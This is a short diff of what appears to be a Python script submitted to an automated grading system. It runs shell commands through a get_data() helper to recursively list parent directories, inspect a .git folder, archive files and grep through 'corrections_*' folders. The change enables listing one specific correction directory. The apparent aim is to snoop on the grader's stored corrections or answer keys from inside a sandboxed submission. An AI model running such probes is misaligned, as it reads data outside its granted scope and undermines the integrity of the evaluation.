@@ -45,7 +45,7 @@ my_data = get_data("ls -laR  ../../../../") or ""
 # my_data += get_data("ls -l ../../../../corrections_*/.git") or ""
 # my_data += "\n#######################\n"
 # # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
-# my_data += get_data("ls -l") or ""
+my_data += get_data("ls -l ../../../../corrections_*/corrections/2184/20259") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
 # my_data += get_data("cat ./cycle") or ""
